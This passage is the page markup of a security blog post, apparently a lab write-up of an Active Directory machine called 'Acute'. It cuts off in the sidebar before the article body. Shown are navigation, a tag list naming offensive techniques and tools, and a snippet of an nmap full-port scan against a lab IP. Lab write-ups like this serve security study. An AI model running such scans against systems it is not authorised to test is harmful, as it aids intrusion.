<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>Tracks-AD-Acute | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="nmap12345678910111213141516171819202122232425└─$ sudo nmap -sS 10.10.11.145 -p- --min-rate&#x3D;3000Nmap scan report for 10.10.11.145Host is up (1.0s latency).Not shown: 65534 filtered tcp ports (no-respon">
<meta property="og:type" content="article">
<meta property="og:title" content="Tracks-AD-Acute">
<meta property="og:url" content="http://example.com/2025/03/13/Tracks-AD-Acute/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="nmap12345678910111213141516171819202122232425└─$ sudo nmap -sS 10.10.11.145 -p- --min-rate&#x3D;3000Nmap scan report for 10.10.11.145Host is up (1.0s latency).Not shown: 65534 filtered tcp ports (no-respon">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2025/tracks-ad/Acute/background.jpg">
<meta property="article:published_time" content="2025-03-13T08:35:07.000Z">
<meta property="article:modified_time" content="2025-03-14T17:02:22.045Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="Powershell">
<meta property="article:tag" content="pswa">
<meta property="article:tag" content="Configuration">
<meta property="article:tag" content="HKLM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2025/tracks-ad/Acute/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
